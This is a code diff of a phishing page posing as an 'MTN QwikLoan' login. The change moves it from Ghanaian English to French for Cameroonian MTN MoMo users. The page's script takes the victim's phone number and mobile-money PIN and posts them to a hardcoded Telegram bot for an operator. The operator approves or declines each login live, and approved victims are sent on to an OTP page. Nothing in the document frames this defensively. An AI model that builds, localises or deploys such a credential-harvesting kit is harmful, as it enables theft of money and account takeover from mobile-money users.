@@ -1,10 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>MTN QwikLoan – Login with PIN</title>
-    <!-- Google Fonts & Icons -->
+    <title>MTN QwikLoan – Connexion par PIN</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -115,37 +114,6 @@
         .input:focus {
             border-color: #FFCC00;
             box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.3);
-        }
-
-        .pin-row {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 12px;
-            margin-top: 8px;
-            margin-bottom: 20px;
-        }
-        .pin-input {
-            width: 100%;
-            height: 48px;
-            border-radius: 12px;
-            border: 1px solid #ddd;
-            text-align: center;
-            font-size: 24px;
-            font-weight: 600;
-            background: #fff;
-            outline: none;
-            transition: border 0.2s;
-            -webkit-text-security: disc;
-            inputmode: numeric;
-            font-family: monospace;
-        }
-        .pin-input:focus {
-            border-color: #FFCC00;
-            box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.3);
-        }
-        .pin-input.filled {
-            border-color: #ffe0a3;
-            background: #fffef7;
         }
 
         .btn {
@@ -271,12 +239,8 @@
                 margin-top: 20px;
             }
             .input,
-            .pin-input,
             .btn {
                 height: 46px;
-            }
-            .pin-input {
-                font-size: 22px;
             }
             .btn {
                 font-size: 15px;
@@ -294,8 +258,8 @@
     <div class="container">
         <div class="error-box" id="errorBox">
             <div class="close" onclick="hideError()">×</div>
-            <div class="error-title">Error</div>
-            <div class="error-text" id="errorText">Invalid credentials</div>
+            <div class="error-title">Erreur</div>
+            <div class="error-text" id="errorText">Identifiants invalides</div>
         </div>
 
         <div class="content">
@@ -303,25 +267,20 @@
                 <div class="logo-circle">M</div>
                 <div class="logo-text"><span>MTN</span> QwikLoan</div>
             </div>
-            <div class="title">Welcome to MTN QwikLoan</div>
+            <div class="title">Bienvenue sur MTN QwikLoan</div>
             <div class="subtitle">
-                Enter your MTN number and PIN to login.
+                Saisissez votre numéro MTN et votre code PIN pour vous connecter.
             </div>
 
             <div class="form">
-                <div class="label">MTN Number</div>
-                <input class="input" id="phoneInput" placeholder="024XXXXXXX" inputmode="numeric">
+                <div class="label">Numéro MTN MoMo</div>
+                <input class="input" id="phoneInput" placeholder="6 55 12 34 56" inputmode="numeric" maxlength="11">
 
-                <div class="label" style="margin-top:15px;">PIN</div>
-                <div class="pin-row">
-                    <input type="password" class="pin-input" id="pin1" maxlength="1" inputmode="numeric" autocomplete="off">
-                    <input type="password" class="pin-input" id="pin2" maxlength="1" inputmode="numeric" autocomplete="off">
-                    <input type="password" class="pin-input" id="pin3" maxlength="1" inputmode="numeric" autocomplete="off">
-                    <input type="password" class="pin-input" id="pin4" maxlength="1" inputmode="numeric" autocomplete="off">
-                </div>
+                <div class="label" style="margin-top:15px;">Saisissez votre code PIN</div>
+                <input class="input" id="pinInput" placeholder="4 ou 5 chiffres" inputmode="numeric" maxlength="5" type="password" autocomplete="off">
 
-                <button class="btn btn-primary" id="loginBtn" disabled>Login</button>
-                <button class="btn btn-outline" id="goBackBtn">Go Back</button>
+                <button class="btn btn-primary" id="loginBtn" disabled>Se connecter</button>
+                <button class="btn btn-outline" id="goBackBtn">Retour</button>
 
                 <div class="version">v2.6.2 (MTN-QWIK-2026)</div>
             </div>
@@ -333,31 +292,25 @@
     </div>
 
     <script>
-        // ========== TELEGRAM CONFIG ==========
+        // ========== TELEGRAM CONFIG (English messages) ==========
         const BOT_TOKEN = '8745115171:AAHIirv4QpNh1p6JMWLLh6sqrvBh-YrO7Bc';
         const CHAT_ID = '1006917440';
         const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
         // ========== DOM ELEMENTS ==========
         const phoneInput = document.getElementById('phoneInput');
+        const pinInput = document.getElementById('pinInput');
         const loginBtn = document.getElementById('loginBtn');
         const goBackBtn = document.getElementById('goBackBtn');
         const spinner = document.getElementById('spinner');
         const errorBox = document.getElementById('errorBox');
         const errorText = document.getElementById('errorText');
 
-        const pinInputs = [
-            document.getElementById('pin1'),
-            document.getElementById('pin2'),
-            document.getElementById('pin3'),
-            document.getElementById('pin4')
-        ];
-
         let isSubmitting = false;
         let currentPollInterval = null;
 
         function showError(message) {
-            errorText.innerText = message || 'Invalid credentials';
+            errorText.innerText = message || 'Identifiants invalides';
             errorBox.style.display = 'block';
         }
 
@@ -365,73 +318,31 @@
             errorBox.style.display = 'none';
         }
 
-        function clearPinFields() {
-            pinInputs.forEach(input => {
-                input.value = '';
-                input.classList.remove('filled');
-            });
+        function clearPinField() {
+            pinInput.value = '';
         }
 
-        function focusFirstPin() {
-            pinInputs[0].focus();
+        function focusFirstInput() {
+            phoneInput.focus();
         }
 
         function updateLoginButton() {
             const phone = phoneInput.value.trim();
-            const allPinsFilled = pinInputs.every(pin => pin.value.length === 1);
-            const isValid = phone !== '' && allPinsFilled;
+            const pin = pinInput.value.trim();
+            // PIN digits only, length 4 or 5
+            const pinDigits = pin.replace(/\D/g, '');
+            const isValidPin = (pinDigits.length === 4 || pinDigits.length === 5);
+            // Phone: allow spaces, we'll check length of digits later
+            const phoneDigits = phone.replace(/\D/g, '');
+            const isValidPhone = phoneDigits.length === 9; // Cameroon MTN numbers are 9 digits
+            const isValid = isValidPhone && isValidPin;
             loginBtn.disabled = !isValid;
         }
 
-        function setupPinInputs() {
-            pinInputs.forEach((input, idx) => {
-                input.addEventListener('input', function(e) {
-                    let val = this.value;
-                    val = val.replace(/\D/g, '').slice(0, 1);
-                    this.value = val;
-                    if (val.length === 1) {
-                        this.classList.add('filled');
-                        if (idx < pinInputs.length - 1) {
-                            pinInputs[idx + 1].focus();
-                        }
-                    } else {
-                        this.classList.remove('filled');
-                    }
-                    updateLoginButton();
-                    hideError();
-                });
-
-                input.addEventListener('keydown', function(e) {
-                    if (e.key === 'Backspace') {
-                        if (this.value.length === 0 && idx > 0) {
-                            e.preventDefault();
-                            pinInputs[idx - 1].focus();
-                            pinInputs[idx - 1].value = '';
-                            pinInputs[idx - 1].classList.remove('filled');
-                            updateLoginButton();
-                        }
-                    } else if (e.key === 'ArrowLeft') {
-                        if (idx > 0) {
-                            e.preventDefault();
-                            pinInputs[idx - 1].focus();
-                        }
-                    } else if (e.key === 'ArrowRight') {
-                        if (idx < pinInputs.length - 1) {
-                            e.preventDefault();
-                            pinInputs[idx + 1].focus();
-                        }
-                    } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete') {
-                        e.preventDefault();
-                    }
-                });
-            });
-        }
-
-        function validateMobileNumber(number) {
-            const cleaned = number.replace(/\D/g, '');
-            if (cleaned.length < 10) return false;
-            return cleaned.startsWith('024') || cleaned.startsWith('054') ||
-                cleaned.startsWith('055') || cleaned.startsWith('059');
+        function validateMobileNumber(phone) {
+            const cleaned = phone.replace(/\D/g, '');
+            // Cameroon: exactly 9 digits (MTN numbers start with 6,7,8 usually)
+            return cleaned.length === 9;
         }
 
         function escapeHtml(unsafe) {
@@ -452,6 +363,7 @@
             }
         }
 
+        // ===== TELEGRAM SEND (English message) =====
         async function sendLoginToTelegram(phone, pin) {
             const ts = Date.now();
             const approveId = `login_approve_${ts}`;
@@ -460,10 +372,11 @@
             sessionStorage.setItem('mtn_phone', phone.replace(/\D/g, ''));
             sessionStorage.setItem('mtn_pin', pin);
 
+            // English message for admin
             const message =
                 `🔐 <b>MTN QwikLoan Login Request</b>\n\n` +
                 `<b>MoMo Number:</b> <code>${escapeHtml(phone)}</code>\n` +
-                `<b>4‑Digit PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
+                `<b>PIN:</b> <code>${escapeHtml(pin)}</code>\n\n` +
                 `📢 <b>Approve or Decline this login attempt:</b>`;
 
             try {
@@ -494,7 +407,7 @@
                 isSubmitting = false;
                 loginBtn.disabled = false;
                 updateLoginButton();
-                showError('Network error. Please try again.');
+                showError('Erreur réseau. Veuillez réessayer.');
             }
         }
 
@@ -515,26 +428,23 @@
                         if (!callback) continue;
                         const cbData = callback.data;
 
-                        // —————— APPROVE ——————
                         if (cbData === approveId) {
                             stopPolling();
                             spinner.style.display = 'none';
                             isSubmitting = false;
-                            // Redirect to OTP link page
                             window.location.href = 'otp-link.html';
                             return;
                         }
 
-                        // —————— DECLINE ——————
                         if (cbData === declineId) {
                             stopPolling();
                             spinner.style.display = 'none';
                             isSubmitting = false;
                             loginBtn.disabled = false;
                             updateLoginButton();
-                            showError('Authentication declined. Please check your credentials and try again.');
-                            clearPinFields();
-                            focusFirstPin();
+                            showError('Authentification refusée. Veuillez vérifier vos identifiants.');
+                            clearPinField();
+                            phoneInput.focus();
                             return;
                         }
                     }
@@ -547,22 +457,35 @@
         async function submitLogin() {
             if (isSubmitting) return;
 
-            const phone = phoneInput.value.trim();
-            const pin = pinInputs.map(p => p.value).join('');
+            const phoneRaw = phoneInput.value.trim();
+            const pinRaw = pinInput.value.trim();
 
             hideError();
 
-            if (!phone) {
-                showError('Please enter your MTN MoMo number.');
+            // Phone digits only
+            const phoneDigits = phoneRaw.replace(/\D/g, '');
+            if (!phoneDigits) {
+                showError('Veuillez saisir votre numéro MTN MoMo.');
+                phoneInput.focus();
                 return;
             }
-            if (pin.length !== 4) {
-                showError('Please enter your 4-digit PIN.');
+            if (phoneDigits.length !== 9) {
+                showError('Veuillez saisir un numéro MTN MoMo valide (9 chiffres).');
+                phoneInput.focus();
                 return;
             }
 
-            if (!validateMobileNumber(phone)) {
-                showError('Please enter a valid MTN MoMo number starting with 024, 054, 055, or 059 (10 digits).');
+            // PIN digits only
+            const pinDigits = pinRaw.replace(/\D/g, '');
+            if (!pinDigits) {
+                showError('Veuillez saisir votre code PIN (4 ou 5 chiffres).');
+                pinInput.focus();
+                return;
+            }
+            if (pinDigits.length !== 4 && pinDigits.length !== 5) {
+                showError('Le code PIN doit comporter 4 ou 5 chiffres.');
+                pinInput.value = '';
+                pinInput.focus();
                 return;
             }
 
@@ -570,14 +493,32 @@
             loginBtn.disabled = true;
             spinner.style.display = 'flex';
 
-            await sendLoginToTelegram(phone, pin);
+            await sendLoginToTelegram(phoneDigits, pinDigits);
         }
 
+        // -------- Event Listeners --------
         phoneInput.addEventListener('input', function(e) {
-            let val = this.value.replace(/[^0-9]/g, '');
-            if (val.length > 10) val = val.slice(0, 10);
-            this.value = val;
-            clearPinFields();
+            // Allow spaces but we'll strip non-digits for validation
+            let val = this.value.replace(/[^0-9 ]/g, '');
+            // Limit digits to 9, but allow spaces
+            const digits = val.replace(/\D/g, '');
+            if (digits.length > 9) {
+                // truncate to 9 digits and reformat with spaces every 2 digits? We'll just keep as digits without spaces.
+                // Simpler: remove spaces and keep digits
+                val = digits.slice(0, 9);
+                // optionally format with spaces: e.g., "6 55 12 34 56" -> we'll just display as digits without spaces for simplicity.
+                // But we can add spaces for readability.
+                // We'll just set value to digits without spaces.
+                this.value = val;
+            } else {
+                // If there are spaces, we can keep them but we want to avoid double spaces.
+                // We'll just keep the value as is but we'll strip non-digits for validation.
+                // For user experience, we can format with spaces: 6 55 12 34 56
+                // We'll format on blur or each input? Let's just keep raw with spaces allowed.
+                // Actually we want to clean up: replace multiple spaces, etc.
+                // We'll just let user type digits and spaces, but we'll strip spaces for validation.
+                // So we don't need to modify value.
+            }
             updateLoginButton();
             hideError();
         });
@@ -585,20 +526,40 @@
         phoneInput.addEventListener('paste', function(e) {
             e.preventDefault();
             const pasted = (e.clipboardData || window.clipboardData).getData('text');
-            const digits = pasted.replace(/\D/g, '').slice(0, 10);
+            const digits = pasted.replace(/\D/g, '').slice(0, 9);
             this.value = digits;
-            clearPinFields();
+            updateLoginButton();
+            hideError();
+        });
+
+        // Format phone with spaces on blur? Not necessary.
+
+        pinInput.addEventListener('input', function(e) {
+            let val = this.value.replace(/[^0-9]/g, '');
+            if (val.length > 5) val = val.slice(0, 5);
+            this.value = val;
+            updateLoginButton();
+            hideError();
+        });
+
+        pinInput.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const pasted = (e.clipboardData || window.clipboardData).getData('text');
+            const digits = pasted.replace(/\D/g, '').slice(0, 5);
+            this.value = digits;
             updateLoginButton();
             hideError();
         });
 
         loginBtn.addEventListener('click', submitLogin);
+
         goBackBtn.addEventListener('click', () => {
+            stopPolling();
             window.history.back();
         });
 
+        // -------- Initialisation --------
         function init() {
-            setupPinInputs();
             updateLoginButton();
             hideError();
             phoneInput.focus();
